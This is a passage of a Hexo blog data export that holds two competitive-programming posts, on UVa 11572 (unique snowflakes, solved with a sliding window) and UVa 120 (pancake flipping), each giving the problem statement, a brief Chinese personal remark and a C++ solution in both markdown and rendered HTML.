has a cool business idea: packaging and selling snowflakes. She has devised a\nmachine that captures snowflakes as they fall, and serializes them into a stream of snowflakes that flow,\none by one, into a package. Once the package is full, it is closed and shipped to be sold.\nThe marketing motto for the company is “bags of uniqueness.” To live up to the motto, every\nsnowflake in a package must be different from the others. Unfortunately, this is easier said than done,\nbecause in reality, many of the snowflakes flowing through the machine are identical. Emily would like\nto know the size of the largest possible package of unique snowflakes that can be created. The machine\ncan start filling the package at any time, but once it starts, all snowflakes flowing from the machine\nmust go into the package until the package is completed and sealed. The package can be completed\nand sealed before all of the snowflakes have flowed out of the machine.\nInput\nThe first line of input contains one integer specifying the number of test cases to follow. Each test\ncase begins with a line containing an integer n, the number of snowflakes processed by the machine.\nThe following n lines each contain an integer (in the range 0 to 109\n, inclusive) uniquely identifying a\nsnowflake. Two snowflakes are identified by the same integer if and only if they are identical.\nThe input will contain no more than one million total snowflakes.\nOutput\nFor each test case output a line containing single integer, the maximum number of unique snowflakes\nthat can be in a package.\nSample Input\n1\n5\n1\n2\n3\n2\n1\nSample Output\n3\n\n最后写来写去，写成了树上的样子。。\n滑动窗口的简单实例\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<string>\n#include<algorithm>\n#include<set>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e7 + 10;\n\nint n, m;\nint a[maxN];\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\twhile (n--)\n\t{\n\t\tscanf(\"%d\", &m);\n\t\tfor (int i = 0; i < m; i++)\n\t\t\tscanf(\"%d\", &a[i]);\n\t\tset<int> s;\n\t\tint L = 0, R = 0, ans = 0;\n\t\twhile (R < m)\n\t\t{\n\t\t\twhile (R < m && !s.count(a[R]))\n\t\t\t\ts.insert(a[R++]);\n\t\t\tans = max(ans, R - L);\n\t\t\ts.erase(a[L++]);\n\t\t}\n\t\tprintf(\"%d\\n\", ans);\n\t}\n\treturn 0;\n}\n```","slug":"UVa-11572","published":1,"updated":"2017-03-24T05:39:07.221Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k2g003ohv18z4cf0dfm","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>Emily the entrepreneur has a cool business idea: packaging and selling snowflakes. She has devised a<br>machine that captures snowflakes as they fall, and serializes them into a stream of snowflakes that flow,<br>one by one, into a package. Once the package is full, it is closed and shipped to be sold.<br>The marketing motto for the company is “bags of uniqueness.” To live up to the motto, every<br>snowflake in a package must be different from the others. Unfortunately, this is easier said than done,<br>because in reality, many of the snowflakes flowing through the machine are identical. Emily would like<br>to know the size of the largest possible package of unique snowflakes that can be created. The machine<br>can start filling the package at any time, but once it starts, all snowflakes flowing from the machine<br>must go into the package until the package is completed and sealed. The package can be completed<br>and sealed before all of the snowflakes have flowed out of the machine.<br>Input<br>The first line of input contains one integer specifying the number of test cases to follow. Each test<br>case begins with a line containing an integer n, the number of snowflakes processed by the machine.<br>The following n lines each contain an integer (in the range 0 to 109<br>, inclusive) uniquely identifying a<br>snowflake. Two snowflakes are identified by the same integer if and only if they are identical.<br>The input will contain no more than one million total snowflakes.<br>Output<br>For each test case output a line containing single integer, the maximum number of unique snowflakes<br>that can be in a package.<br>Sample Input<br>1<br>5<br>1<br>2<br>3<br>2<br>1<br>Sample Output<br>3</p>\n</blockquote>\n<p>最后写来写去，写成了树上的样子。。<br>滑动窗口的简单实例</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;set&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e7</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, m;</div><div class=\"line\"><span class=\"keyword\">int</span> a[maxN];</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (n--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;m);</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;a[i]);</div><div class=\"line\">\t\t<span class=\"built_in\">set</span>&lt;<span class=\"keyword\">int</span>&gt; s;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> L = <span class=\"number\">0</span>, R = <span class=\"number\">0</span>, ans = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (R &lt; m)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (R &lt; m &amp;&amp; !s.count(a[R]))</div><div class=\"line\">\t\t\t\ts.insert(a[R++]);</div><div class=\"line\">\t\t\tans = max(ans, R - L);</div><div class=\"line\">\t\t\ts.erase(a[L++]);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, ans);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>Emily the entrepreneur has a cool business idea: packaging and selling snowflakes. She has devised a<br>machine that captures snowflakes as they fall, and serializes them into a stream of snowflakes that flow,<br>one by one, into a package. Once the package is full, it is closed and shipped to be sold.<br>The marketing motto for the company is “bags of uniqueness.” To live up to the motto, every<br>snowflake in a package must be different from the others. Unfortunately, this is easier said than done,<br>because in reality, many of the snowflakes flowing through the machine are identical. Emily would like<br>to know the size of the largest possible package of unique snowflakes that can be created. The machine<br>can start filling the package at any time, but once it starts, all snowflakes flowing from the machine<br>must go into the package until the package is completed and sealed. The package can be completed<br>and sealed before all of the snowflakes have flowed out of the machine.<br>Input<br>The first line of input contains one integer specifying the number of test cases to follow. Each test<br>case begins with a line containing an integer n, the number of snowflakes processed by the machine.<br>The following n lines each contain an integer (in the range 0 to 109<br>, inclusive) uniquely identifying a<br>snowflake. Two snowflakes are identified by the same integer if and only if they are identical.<br>The input will contain no more than one million total snowflakes.<br>Output<br>For each test case output a line containing single integer, the maximum number of unique snowflakes<br>that can be in a package.<br>Sample Input<br>1<br>5<br>1<br>2<br>3<br>2<br>1<br>Sample Output<br>3</p>\n</blockquote>\n<p>最后写来写去，写成了树上的样子。。<br>滑动窗口的简单实例</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;set&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e7</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, m;</div><div class=\"line\"><span class=\"keyword\">int</span> a[maxN];</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (n--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;m);</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;a[i]);</div><div class=\"line\">\t\t<span class=\"built_in\">set</span>&lt;<span class=\"keyword\">int</span>&gt; s;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> L = <span class=\"number\">0</span>, R = <span class=\"number\">0</span>, ans = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (R &lt; m)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (R &lt; m &amp;&amp; !s.count(a[R]))</div><div class=\"line\">\t\t\t\ts.insert(a[R++]);</div><div class=\"line\">\t\t\tans = max(ans, R - L);</div><div class=\"line\">\t\t\ts.erase(a[L++]);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, ans);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"UVa 120","date":"2017-03-17T06:29:43.000Z","_content":"\n### Description\n\n>Stacks and Queues are often considered the bread and butter of data structures and find use in architecture,\nparsing, operating systems, and discrete event simulation. Stacks are also important in the\ntheory of formal languages.\nThis problem involves both butter and sustenance in the form of pancakes rather than bread in\naddition to a finicky server who flips pancakes according to a unique, but complete set of rules.\nGiven a stack of pancakes, you are to write a program that indicates how the stack can be sorted\nso that the largest pancake is on the bottom and the smallest pancake is on the top. The size of a\npancake is given by the pancake’s diameter. All pancakes in a stack have different diameters.\nSorting a stack is done by a sequence of pancake “flips”. A flip consists of inserting a spatula\nbetween two pancakes in a stack and flipping (reversing) all the pancakes on the spatula (reversing the\nsub-stack). A flip is specified by giving the position of the pancake on the bottom of the sub-stack to\nbe flipped (relative to the whole stack). The pancake on the bottom of the whole stack has position 1\nand the pancake on the top of a stack of n pancakes has position n.\nA stack is specified by giving the diameter of each pancake in the stack in the order in which the\npancakes appear.\nFor example, consider the three stacks of pancakes below (in which pancake 8 is the top-most\npancake of the left stack):\n8 7 2\n4 6 5\n6 4 8\n7 8 4\n5 5 6\n2 2 7\nThe stack on the left can be transformed to the stack in the middle via flip(3). The middle stack can\nbe transformed into the right stack via the command flip(1).\nInput\nThe input consists of a sequence of stacks of pancakes. Each stack will consist of between 1 and 30\npancakes and each pancake will have an integer diameter between 1 and 100. The input is terminated\nby end-of-file. Each stack is given as a single line of input with the top pancake on a stack appearing\nfirst on a line, the bottom pancake appearing last, and all pancakes separated by a space.\nOutput\nFor each stack of pancakes, the output should echo the original stack on one line, followed by some\nsequence of flips that results in the stack of pancakes being sorted so that the largest diameter pancake\nis on the bottom and the smallest on top. For each stack the sequence of flips should be terminated by\na ‘0’ (indicating no more flips necessary). Once a stack is sorted, no more flips should be made.\nSample Input\n1 2 3 4 5\n5 4 3 2 1\n5 1 2 3 4\nSample Output\n1 2 3 4 5\n0\n5 4 3 2 1\n1 0\n5 1 2 3 4\n1 2 0\n\n改来改去终于对了，还有很长的路要走啊，最近天天做梦梦到考研，仿佛是看到了浙大一样，为什么会这么强烈呢，大概还是后悔高中最后的那段日子吧。不过那是那时我的选择，无论怎样，都是不可复制的人生。\n\n### Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<string>\n#include<algorithm>\n\nusing namespace std;\ntypedef long long LL;\n\nint p[101];\nint a[101];\nchar x;\nint y;\nint pos;\nint cur = 1;\n\nint getpos(int n)\n{\n\tfor (int i = 1; i < cur; i++)\n\t{\n\t\tif (p[i] == n)\n\t\t\treturn i;\n\t}\n}\n\nvoid _swap(int begin, int end)\n{\n\tfor (; end > begin; end--, begin++)\n\t{\n\t\tswap(p[begin], p[end]);\n\t}\n}\n\nbool check(int n)\n{\n\tfor (int i = n; i > 1; i--)\n\t\tif (a[i] != p[i])\n\t\t\treturn false;\n\treturn true;\n}\n\nint main()\n{\n\twhile (true)\n\t{\n\t\tcur = 1;\n\t\twhile (scanf(\"%d\", &y))\n\t\t{\n\t\t\tx = getchar();\n\t\t\tif (x == EOF)\n\t\t\t\treturn 0;\n\t\t\ta[cur] = y;\n\t\t\tp[cur++] = y;\n\t\t\tif (x == '\\n')\n\t\t\t\tbreak;\n\t\t}\n\t\tfor (int i = 1; i < cur; i++)\n\t\t\ti != cur - 1 ? printf(\"%d \", p[i]) : printf(\"%d\\n\", p[i]);\n\t\tsort(a + 1, a + cur);\n\t\tfor (int i = cur - 1; i > 1; i--)\n\t\t{\n\t\t\tif (!check(i))\n\t\t\t{\n\t\t\t\tpos = getpos(a[i]);\n\t\t\t\t_swap(1, pos);\n\t\t\t\tprintf(\"%d \", cur - pos);\n\t\t\t\t_swap(1, i);\n\t\t\t\tprintf(\"%d \", cur - i);\n\t\t\t}\n\t\t}\n\t\tprintf(\"0\\n\");\n\t}\n\treturn 0;\n}\n```","source":"_posts/UVa-120.md","raw":"---\ntitle: UVa 120\ntags:\n  - 构造法\n  - UVa\ncategories: []\ndate: 2017-03-17 14:29:43\n---\n\n### Description\n\n>Stacks and Queues are often considered the bread and butter of data structures and find use in architecture,\nparsing, operating systems, and discrete event simulation. Stacks are also important in the\ntheory of formal languages.\nThis problem involves both butter and sustenance in the form of pancakes rather than bread in\naddition to a finicky server who flips pancakes according to a unique, but complete set of rules.\nGiven a stack of pancakes, you are to write a program that indicates how the stack can be sorted\nso that the largest pancake is on the bottom and the smallest pancake is on the top. The size of a\npancake is given by the pancake’s diameter. All pancakes in a stack have different diameters.\nSorting a stack is done by a sequence of pancake “flips”. A flip consists of inserting a spatula\nbetween two pancakes in a stack and flipping (reversing) all the pancakes on the spatula (reversing the\nsub-stack). A flip is specified by giving the position of the pancake on the bottom of the sub-stack to\nbe flipped (relative to the whole stack). The pancake on the bottom of the whole stack has position 1\nand the pancake on the top of a stack of n pancakes has position n.\nA stack is specified by giving the diameter of each pancake in the stack in the order in which the\npancakes appear.\nFor example, consider the three stacks of pancakes below (in which pancake 8 is the top-most\npancake of the left stack):\n8 7 2\n4 6 5\n6 4 8\n7 8 4\n5 5 6\n2 2 7\nThe stack on the left can be transformed to the stack in the middle via flip(3). The middle stack can\nbe transformed into the right stack via the command flip(1).\nInput\nThe input consists of a sequence of stacks of pancakes. Each stack will consist of between 1 and 30\npancakes and each pancake will have an integer diameter between 1 and 100. The input is terminated\nby end-of-file. Each stack is given as a single line of input with the top pancake on a stack appearing\nfirst on a line, the bottom pancake appearing last, and all pancakes separated by a space.\nOutput\nFor each stack of pancakes, the output should echo the original stack on one line, followed by some\nsequence of flips that results in the stack of pancakes being sorted so that the largest diameter pancake\nis on the bottom and the smallest on top. For each stack the sequence of flips should be terminated by\na ‘0’ (indicating no more flips necessary). Once a stack is sorted, no more flips should be made.\nSample Input\n1 2 3 4 5\n5 4 3 2 1\n5 1 2 3 4\nSample Output\n1 2 3 4 5\n0\n5 4 3 2 1\n1 0\n5 1 2 3 4\n1 2 0\n\n改来改去终于对了，还有很长的路要走啊，最近天天做梦梦到考研，仿佛是看到了浙大一样，为什么会这么强烈呢，大概还是后悔高中最后的那段日子吧。不过那是那时我的选择，无论怎样，都是不可复制的人生。\n\n### Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<string>\n#include<algorithm>\n\nusing namespace std;\ntypedef long long LL;\n\nint p[101];\nint a[101];\nchar x;\nint y;\nint pos;\nint cur = 1;\n\nint getpos(int n)\n{\n\tfor (int i = 1; i < cur; i++)\n\t{\n\t\tif (p[i] == n)\n\t\t\treturn i;\n\t}\n}\n\nvoid _swap(int begin, int end)\n{\n\tfor (; end > begin; end--, begin++)\n\t{\n\t\tswap(p[begin], p[end]);\n\t}\n}\n\nbool check(int n)\n{\n\tfor (int i = n; i > 1; i--)\n\t\tif (a[i] != p[i])\n\t\t\treturn false;\n\treturn true;\n}\n\nint main()\n{\n\twhile (true)\n\t{\n\t\tcur = 1;\n\t\twhile (scanf(\"%d\", &y))\n\t\t{\n\t\t\tx = getchar();\n\t\t\tif (x == EOF)\n\t\t\t\treturn 0;\n\t\t\ta[cur] = y;\n\t\t\tp[cur++] = y;\n\t\t\tif (x == '\\n')\n\t\t\t\tbreak;\n\t\t}\n\t\tfor (int i = 1; i < cur; i++)\n\t\t\ti != cur - 1 ? printf(\"%d \", p[i]) : printf(\"%d\\n\", p[i]);\n\t\tsort(a + 1, a + cur);\n\t\tfor (int i = cur - 1; i > 1; i--)\n\t\t{\n\t\t\tif (!check(i))\n\t\t\t{\n\t\t\t\tpos = getpos(a[i]);\n\t\t\t\t_swap(1, pos);\n\t\t\t\tprintf(\"%d \", cur - pos);\n\t\t\t\t_swap(1, i);\n\t\t\t\tprintf(\"%d \", cur - i);\n\t\t\t}\n\t\t}\n\t\tprintf(\"0\\n\");\n\t}\n\treturn 0;\n}\n```","slug":"UVa-120","published":1,"updated":"2017-03-20T15:01:44.506Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k2j003qhv186ypgykul","content":"<h3 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h3><blockquote>\n<p>Stacks and Queues are often considered the bread and butter of data structures and find use in architecture,<br>parsing, operating systems, and discrete event simulation. Stacks are also important in the<br>theory of formal languages.<br>This problem involves both butter and sustenance in the form of pancakes rather than bread in<br>addition to a finicky server who flips pancakes according to a unique, but complete set of rules.<br>Given a stack of pancakes, you are to write a program that indicates how the stack can be sorted<br>so that the largest pancake is on the bottom and the smallest pancake is on the top. The size of a<br>pancake is given by the pancake’s diameter. All pancakes in a stack have different diameters.<br>Sorting a stack is done by a sequence of pancake “flips”. A flip consists of inserting a spatula<br>between two pancakes in a stack and flipping (reversing) all the pancakes on the spatula (reversing the<br>sub-stack). A flip is specified by giving the position of the pancake on the bottom of the sub-stack to<br>be flipped (relative to the whole stack). The pancake on the bottom of the whole stack has position 1<br>and the pancake on the top of a stack of n pancakes has position n.<br>A stack is specified by giving the diameter of each pancake in the stack in the order in which the<br>pancakes appear.<br>For example, consider the three stacks of pancakes below (in which pancake 8 is the top-most<br>pancake of the left stack):<br>8 7 2<br>4 6 5<br>6 4 8<br>7 8 4<br>5 5 6<br>2 2 7<br>The stack on the left can be transformed to the stack in the middle via flip(3). The middle stack can<br>be transformed into the right stack via the command flip(1).<br>Input<br>The input consists of a sequence of stacks of pancakes. Each stack will consist of between 1 and 30<br>pancakes and each pancake will have an integer diameter between 1 and 100. The input is terminated<br>by end-of-file. Each stack is given as a single line of input with the top pancake on a stack appearing<br>first on a line, the bottom pancake appearing last, and all pancakes separated by a space.<br>Output<br>For each stack of pancakes, the output should echo the original stack on one line, followed by some<br>sequence of flips that results in the stack of pancakes being sorted so that the largest diameter pancake<br>is on the bottom and the smallest on top. For each stack the sequence of flips should be terminated by<br>a ‘0’ (indicating no more flips necessary). Once a stack is sorted, no more flips should be made.<br>Sample Input<br>1 2 3 4 5<br>5 4 3 2 1<br>5 1 2 3 4<br>Sample Output<br>1 2 3 4 5<br>0<br>5 4 3 2 1<br>1 0<br>5 1 2 3 4<br>1 2 0</p>\n</blockquote>\n<p>改来改去终于对了，还有很长的路要走啊，最近天天做梦梦到考研，仿佛是看到了浙大一样，为什么会这么强烈呢，大概还是后悔高中最后的那段日子吧。不过那是那时我的选择，无论怎样，都是不可复制的人生。</p>\n<h3 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> p[<span class=\"number\">101</span>];</div><div class=\"line\"><span class=\"keyword\">int</span> a[<span class=\"number\">101</span>];</div><div class=\"line\"><span class=\"keyword\">char</span> x;</div><div class=\"line\"><span class=\"keyword\">int</span> y;</div><div class=\"line\"><span class=\"keyword\">int</span> pos;</div><div class=\"line\"><span class=\"keyword\">int</span> cur = <span class=\"number\">1</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getpos</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt; cur; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (p[i] == n)</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> i;</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">void</span> _swap(<span class=\"keyword\">int</span> begin, <span class=\"keyword\">int</span> end)</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (; end &gt; begin; end--, begin++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tswap(p[begin], p[end]);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">check</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = n; i &gt; <span class=\"number\">1</span>; i--)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (a[i] != p[i])</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tcur = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;y))</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tx = getchar();</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (x == EOF)</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\ta[cur] = y;</div><div class=\"line\">\t\t\tp[cur++] = y;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (x == <span class=\"string\">'\\n'</span>)</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt; cur; i++)</div><div class=\"line\">\t\t\ti != cur - <span class=\"number\">1</span> ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, p[i]) : <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, p[i]);</div><div class=\"line\">\t\tsort(a + <span class=\"number\">1</span>, a + cur);</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = cur - <span class=\"number\">1</span>; i &gt; <span class=\"number\">1</span>; i--)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> 